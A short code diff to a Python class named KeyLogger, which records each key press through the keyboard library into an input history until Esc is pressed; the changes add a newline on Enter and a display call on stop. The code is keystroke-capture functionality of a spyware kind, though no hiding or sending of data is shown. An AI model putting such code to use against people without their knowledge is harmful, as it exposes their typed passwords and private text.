@@ -26,13 +26,17 @@ class KeyLogger:
         keyboard.wait('esc')
 
         self.listener.stop_listening()
+        self.text_display.display_text()
         print("Keylogger stopped.")
+
 
     def handle_keyboard_event(self, event):
         """Обработка события нажатия клавиши"""
         # text = f'Key {event.name} {event.event_type}'
         text = event.name
         # self.text_display.display_text(text)
+        if event.name == 'enter':
+            text += '\n'
         self.input_history.save_input(text)
         # print(text)
 
